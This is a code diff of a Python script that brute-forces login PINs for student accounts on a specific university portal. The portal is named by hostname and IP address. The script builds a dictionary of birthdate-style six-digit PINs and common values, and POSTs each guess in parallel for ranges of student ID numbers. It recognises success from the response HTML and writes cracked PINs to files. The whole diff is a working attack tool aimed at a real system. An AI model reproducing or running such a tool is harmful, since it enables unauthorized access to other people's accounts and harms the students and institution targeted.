@@ -1,58 +1,36 @@
 #!/usr/bin/python3
+
 import multiprocessing
+import gc
 import time
-from SConnector import SConnector
-
-DICTIONARY = []
-
-
-def multi(nim, pin, shared):
-    if not shared.found:
-        conn = SConnector(nim, pin)
-        conn.connect()
-        if conn.status:
-            shared.found = True
-            return pin
-    return
+import requests
+import sys
 
 
-class SBrute(object):
-    def __init__(self, nim, process):
-        self.nim = nim
-        self.process = process
+def init():
+    global URL
+    global OK_TXT
 
-    def start(self, mt):
-        start_time = time.time()
-        print('Starting bruteforce for {}'.format(self.nim))
-        global DICTIONARY
+    # URL = "http://sion.stikom-bali.ac.id/load_login.php"
+    URL = "http://180.250.7.188/load_login.php"
+    OK_TXT = """<script language="JavaScript1.2">document.getElementById('usern').style.backgroundColor='#F3F3F3';document.getElementById('passw').style.backgroundColor='#F3F3F3'</script><div id="divTarget">Success </div><script language="javascript">window.location ='/reg/'</script>"""
 
-        shared = multiprocessing.Manager().Namespace()
-        shared.found = False
 
-        if self.process is None:
-            p = multiprocessing.Pool()
-        else:
-            p = multiprocessing.Pool(self.process)
-
-        result = p.starmap(multi,
-                           [[self.nim, d, shared] for d in DICTIONARY])
-        result = list(set(result))
-        result.remove(None)
-        p.close()
-        p.join()
-
-        if len(result) == 1:
-            print('Found {} {} time elapsed {}s'
-                  .format(self.nim, result[0], time.time()-start_time))
-        else:
-            print('Failed {} time elapsed {}s'
-                  .format(self.nim, time.time()-start_time))
+def init_color():
+    global COLORED
+    try:
+        from colorama import Style, Back, Fore
+        COLORED = Fore
+    except:
+        print("Please install colorama (pip install colorama) to enable color")
+        COLORED = False
 
 
 def init_dictionary(start_year=97, end_year=99):
     global DICTIONARY
 
-    print("Generating dictionary...")
+    start_time = time.time()
+    DICTIONARY = []
     for yy in range(start_year, end_year+1):
         for mm in range(1, 13):
             for dd in range(1, 32):
@@ -66,38 +44,125 @@ def init_dictionary(start_year=97, end_year=99):
                 DICTIONARY.append(str(yy).zfill(2)[-2:]
                                   + str(mm).zfill(2)
                                   + str(dd).zfill(2))
-    print("Dictionary generated {} values".format(len(DICTIONARY)))
+    # put extra values here
+    DICTIONARY += [
+        "000000",
+        "111111",
+        "222222",
+        "333333",
+        "444444",
+        "555555",
+        "666666",
+        "777777",
+        "888888",
+        "999999",
+        "123456",
+        "654321"
+    ]
+    DICTIONARY = list(set(DICTIONARY))
+    total_time = time.time()-start_time
+
+    print("Dictionary generated {} values in {}s"
+          .format(len(DICTIONARY), total_time))
+
+
+def login(pin):
+    global URL
+    global OK_TXT
+    global SHARED
+    global NIM
+
+    if not SHARED.found and not SHARED.exception:
+        try:
+            data = {"usern": nim, "passw": pin}
+            r = requests.post(URL, data=data)
+            if r.text == OK_TXT:
+                SHARED.found = True
+                return pin
+        except:
+            SHARED.exception = True
+    return
+
+
+def brute(nim, process):
+    global DICTIONARY
+    global SHARED
+    global NIM
+    global COLORED
+
+    start_time = time.time()
+    sys.stdout.write('Trying for {} '.format(nim))
+    sys.stdout.flush()
+
+    NIM = nim
+    SHARED = multiprocessing.Manager().Namespace()
+    SHARED.found = False
+    SHARED.exception = False
+
+    p = multiprocessing.Pool(process)
+    result = p.map(login, DICTIONARY)
+    result = list(set(result))
+    result.remove(None)
+    p.close()
+    p.join()
+    total_time = time.time() - start_time
+
+    if SHARED.exception:
+        SHARED.exception = False
+        with open('exception.txt', 'a') as logfile:
+            logfile.write(str(nim) + ' ')
+        sys.stdout.write(COLORED.YELLOW if COLORED else '')
+        sys.stdout.write('\rException occured for {} '.format(nim))
+    elif len(result) == 1:
+        with open('found/{}'.format(nim), 'w') as logfile:
+            logfile.write(result[0])
+        sys.stdout.write(COLORED.GREEN if COLORED else '')
+        sys.stdout.write('\rFound {} {} '.format(nim, result[0]))
+    else:
+        sys.stdout.write(COLORED.RED if COLORED else '')
+        sys.stdout.write('\rFailed {} '.format(nim))
+    print("time elapsed {}s".format(total_time))
+    sys.stdout.write(COLORED.RESET if COLORED else '')
 
 
 if __name__ == '__main__':
     import argparse
 
     parser = argparse.ArgumentParser()
-    parser.add_argument("--start",
-                        help="start of NIM to bruteforce",
-                        required=True)
-    parser.add_argument("--end",
-                        help="end of NIM to bruteforce",
-                        required=True)
-    parser.add_argument('--process',
+    parser.add_argument("--target",
+                        metavar="TARGET",
                         type=int,
+                        help="target NIM to bruteforce ",
+                        nargs="*")
+    parser.add_argument("--range",
+                        metavar=("START", "END"),
+                        type=int,
+                        nargs=2,
+                        help="range of target NIM to bruteforce, END is included in the range")
+    parser.add_argument('-p', '--process',
+                        type=int,
+                        default=multiprocessing.cpu_count,
                         help="Specify number of process to use, default value is CPU Count. It's more limiting to RAM than CPU, use with CAUTION!!!")
     args = parser.parse_args()
 
-    # print(args.process)
-    if args.process is None:
-        print("Number of processes not specified (see --help). Falling back to default CPU Count...")
-        proc = multiprocessing.cpu_count()
+    target = []
+
+    if args.target:
+        target = args.target
+    elif args.range:
+        target = [n for n in range(args.range[0], args.range[1])]
     else:
-        proc = args.process
-    print("Starting bruteforce with {} processes".format(proc))
-    # print(args.start)
-    # print(args.end)
+        print("Target not set, please see --help")
+        exit(1)
+
+    process = args.process
+
+    init()
+    init_color()
     init_dictionary()
 
-    start = int(args.start)
-    end = int(args.end)+1
+    print("Starting bruteforce with {} processes for {} target(s)".format(process, len(target)))
 
-    for n in range(start, end):
-        target = SBrute(n, args.process)
-        target.start(True)
+    for nim in target:
+        brute(nim=nim, process=process)
+        gc.collect()
